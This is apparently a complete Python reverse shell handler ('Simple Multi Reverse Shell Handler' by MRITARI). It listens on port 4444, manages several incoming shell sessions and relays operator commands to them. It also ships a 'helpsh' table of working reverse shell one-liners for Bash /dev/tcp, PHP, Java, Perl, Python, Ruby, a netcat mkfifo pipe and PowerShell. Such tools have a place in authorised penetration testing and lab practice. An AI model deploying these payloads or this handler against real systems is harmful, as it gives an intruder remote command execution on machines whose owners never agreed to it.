#!/usr/bin/env python3
import socket
import threading
import sys
import select
import queue
import os
from colorama import Fore, Back, Style
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import TerminalFormatter

version = "1.0.0"
IP = '127.0.0.1'
HOST = '0.0.0.0'
PORT = 4444
clients = {}
output_queues = {}
client_lock = threading.Lock()
next_id = 1
current_client = None  # Selected client ID
shells = {
    "Bash": f'/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',
    "PHP": f'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "Java": f'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT}; cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])\np.waitFor()',
    "Perl": f'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    "Python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    "Ruby": f'ruby -rsocket -e \'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "Netcat": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f',
    "PowerShell": f'$sm=(New-Object Net.Sockets.TCPClient("{IP}",{PORT})).GetStream();[byte[]]$bt=0..255|%{{0}};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}}',
}
def banner():
    print(f"""
{Fore.RED}   _____  __  __   _____     _____{Fore.RESET}    _    _                 _ _           
{Fore.RED}  / ____||  \\/  | |  __ \\   / ____|{Fore.RESET}  | |  | |               | | |          
{Fore.RED} | (___  | \\  / | | |__) | | (___    {Fore.RESET}| |__| | __ _ _ __   __| | | ___ _ __ 
{Fore.RED}  \\___ \\ | |\\/| | |  _  /   \\___ \\{Fore.RESET}   |  __  |/ _` | '_ \\ / _` | |/ _ \\ '__|
{Fore.RED}  ____) || |  | |_| | \\ \\ _ ____) |{Fore.RESET}  | |  | | (_| | | | | (_| | |  __/ |   
{Fore.RED} |_____(_)_|  |_(_)_|  \\_(_)_____(_){Fore.RESET} |_|  |_|\\__,_|_| |_|\\__,_|_|\\___|_|   
 {Fore.RED}Simple Multi Reverse Shell{Fore.RESET} Handler
 {Fore.GREEN}By MRITARI{Fore.RESET}
 {Fore.GREEN}Version {version}{Fore.RESET}                                                                         
                                                                           
{Fore.CYAN}[*]{Fore.RESET} Listening on {Fore.GREEN}{HOST}:{PORT}{Fore.RESET}
{Fore.BLUE}[i]{Fore.RESET} Type {Fore.CYAN}'exit'{Fore.RESET} to quit and {Fore.CYAN}'help'{Fore.RESET} to print help.""")
def handle_client(client_socket, client_addr, client_id):
    """Receive output from a client and store in its queue."""
    q = queue.Queue()
    with client_lock:
        output_queues[client_id] = q
    print(f"{Fore.GREEN}[+]{Fore.RESET} Client {client_id} connected from {client_addr}")
    while True:
        try:
            ready, _, _ = select.select([client_socket], [], [], 1.0)
            if ready:
                data = client_socket.recv(4096)
                if not data:
                    break
                q.put(data.decode('utf-8', errors='ignore'))
        except:
            break
    with client_lock:
        client_socket.close()
        clients.pop(client_id, None)
        output_queues.pop(client_id, None)
        global current_client
        if current_client == client_id:
            current_client = None
    print(f"{Fore.RED}[-]{Fore.RESET} Client {client_id} disconnected.")

def output_worker():
    """Print output only from the currently selected client."""
    while True:
        with client_lock:
            active_ids = list(output_queues.keys())
        for cid in active_ids:
            q = output_queues.get(cid)
            if q:
                try:
                    while not q.empty():
                        data = q.get_nowait()
                        if current_client == cid:
                            sys.stdout.write(data)
                            sys.stdout.flush()
                except:
                    pass
        threading.Event().wait(0.1)


def interactive_shell():
    global current_client
    threading.Thread(target=listener, daemon=True).start()
    threading.Thread(target=output_worker, daemon=True).start()

    while True:
        try:
            cmd = input().strip()

            if not cmd:
                continue
            if cmd == 'list':
                with client_lock:
                    if clients:
                        print(f"{Fore.BLUE}[i]{Fore.RESET} Active clients:")
                        for cid, (_, addr) in clients.items():
                            status = f" {Fore.GREEN}[+]{Fore.RESET}" if current_client == cid else f" {Fore.GREEN}[-]{Fore.RESET}"
                            print(f"  {status} [{cid}] {addr[0]}:{addr[1]}")
                    else:
                        print(f"{Fore.BLUE}[i]{Fore.RESET} No clients connected.")
            elif cmd.startswith('use '):
                try:
                    target = int(cmd.split()[1])
                    with client_lock:
                        if target in clients:
                            current_client = target
                            print(f"{Fore.GREEN}[+]{Fore.RESET} Switched to client {target}")
                        else:
                            print(f"{Fore.YELLOW}[!]{Fore.RESET} Client not found.")
                except:
                    print(f"{Fore.BLUE}[i]{Fore.RESET} Usage: use <id>")
            elif cmd == 'help':
                print(f"""
{Fore.BLUE}[i]{Fore.RESET} Commands:
  list          List connected clients
  use <id>      Switch to a client
  help          Show this menu
  helpsh        Please help shells!!!
  exit          Quit the tool
                """.strip())
            elif cmd == 'helpsh':
                print(f"{Fore.CYAN}-------------- Reverse Shell One-Liners from {Fore.BLUE}https://www.invicti.com/learn/reverse-shell:{Fore.CYAN} --------------{Fore.RESET}")
                for lang, code in shells.items():
                    lexer_name = {
                        "Bash": "bash",
                        "PHP": "php",
                        "Java": "java",
                        "Perl": "perl",
                        "Python": "python",
                        "Ruby": "ruby",
                        "Netcat": "bash",
                        "PowerShell": "powershell"
                    }.get(lang, "text")

                    print(f"{Fore.BLUE}[i]{Fore.RESET} {lang}")

                    try:
                        lexer = get_lexer_by_name(lexer_name, stripall=False)
                        formatter = TerminalFormatter()
                        colored = highlight(code, lexer, formatter)
                        print(colored.rstrip())
                    except:
                        print(code)
                    print("\n\n")

                    
                print(f"{Fore.CYAN}--------------------------------------------------------------------------------------------------------{Fore.RESET}")
            elif cmd == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                banner()
            elif cmd == 'cls':
                os.system('cls' if os.name == 'nt' else 'clear')
                banner()
            elif cmd == 'exit':
                print(f"{Fore.BLUE}[i]{Fore.RESET} Shutting down...")
                with client_lock:
                    for sock, _ in list(clients.values()):
                        try:
                            sock.close()
                        except:
                            pass
                break
            elif cmd == 'quit':
                print(f"{Fore.BLUE}[i]{Fore.RESET} Shutting down...")
                with client_lock:
                    for sock, _ in list(clients.values()):
                        try:
                            sock.close()
                        except:
                            pass
                break
            else:
                if current_client and current_client in clients:
                    sock, _ = clients[current_client]
                    try:
                        sock.send((cmd + '\n').encode('utf-8'))
                    except:
                        print(f"{Fore.YELLOW}[!]{Fore.RESET} Failed to send command.")
                else:
                    print(f"{Fore.YELLOW}[!]{Fore.RESET} No client selected. Use 'use <id>' first.")

        except (KeyboardInterrupt, EOFError):
            print(f"{Fore.BLUE}[i]{Fore.RESET} Use 'exit' to quit.")
        except Exception as e:
            print(f"{Fore.RED}[Error] {e}")


def listener():
    """Accept new reverse shell connections."""
    global next_id, current_client

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    while True:
        try:
            client_sock, addr = server.accept()
            client_sock.setblocking(False)
            with client_lock:
                cid = next_id
                clients[cid] = (client_sock, addr)
                next_id += 1
            threading.Thread(
                target=handle_client,
                args=(client_sock, addr, cid),
                daemon=True
            ).start()
            if len(clients) == 1:
                current_client = cid
                print(f"{Fore.CYAN}[*]{Fore.RESET} Auto-selected client {cid}")

        except Exception as e:
            print(f"{Fore.YELLOW}[!]{Fore.RESET} Listener error: {e}")
            break

if __name__ == "__main__":
    banner()
    try:
        interactive_shell()
    except KeyboardInterrupt:
        print(f"{Fore.BLUE}[i]{Fore.RESET} Shutting down...")